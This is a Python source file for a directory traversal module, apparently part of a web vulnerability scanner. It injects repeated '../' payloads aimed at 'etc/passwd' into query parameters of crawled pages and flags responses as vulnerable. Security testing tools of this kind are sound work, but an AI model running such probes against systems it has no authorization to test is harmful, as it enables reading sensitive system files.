from crawler import Crawler
from generator import ExploitGenerator

import httplib2, urllib, urllib2
from BeautifulSoup import BeautifulSoup, SoupStrainer
from urlparse import urljoin, urlparse
from helper import has_form, parse_form, post_request, create_get_params
from sets import Set

EXPLOIT_PATH = "exploits/"
EXPLOIT_TYPE = "dt"
EXPLOIT_CLASS = "Directory Traversal"


class DTModule:
    """
    DT Module
    Checks for Directory Traversal vulnerability
    """

    def __init__(self, url, pages):
        self.url = url
        self.pages = pages
        self.logs = {}
        
    def log_results(self, results, category):
        log = {}
        log["class"] = category
        log["results"] = {}
        processed_results = []
        for result in results:
            processed_result = {}
            processed_result["endpoint"] = result[0]
            processed_result["params"] = result[1]
            processed_result["method"] = result[2]
            processed_results.append(processed_result)
        log["results"][self.url] = processed_results
        return log

    def retrieve_params(self, params):
        result = []
        split = params.split("&")
        for x in split:
            param = x.split("=")
            result.append(param[0])

        return result

    def prepare_params(self, extracted, depth, file):
        path = "./"
        params = self.retrieve_params(extracted)

        results = []
        # go 10 depths into the traversal
        for x in range(1, depth):
            path += "../" 
            test = path + file

            # join all params together
            combined = ""
            for y in params:
                combined = y + "=" + test + "&"
            results.append(combined.rstrip("&"))

        return results

    def in_cache(self, cache, string):
        result = False
        for x in cache:
            if str(x) == str(string):
                result = True
        return result
        
    def scan(self):
    
        results = []
        cache = []

        for web_page in self.pages:
            http = httplib2.Http()
            status, response = http.request(web_page)
            parsed = urlparse(web_page)

            # handle scan for get params
            if parsed.query:
                #print("testing page: " + web_page)
                payloads = self.prepare_params(parsed.query, 100, "etc/passwd")
                
                for payload in payloads:
                    url = parsed.scheme + "://" + parsed.hostname + parsed.path + "?" + payload
                    new_status, new_response = http.request(url)

                    if new_status.status == 200 and int(new_status['content-length']) > int(status['content-length']):
                        #print("vulnerable url: " + url + "\n")
                        if not self.in_cache(cache, url):
                            results.append((urlparse(url).path, create_get_params(url), "GET"))
                            cache.append(url)
                            break  
                        break


                        
        self.logs = self.log_results(results, EXPLOIT_CLASS)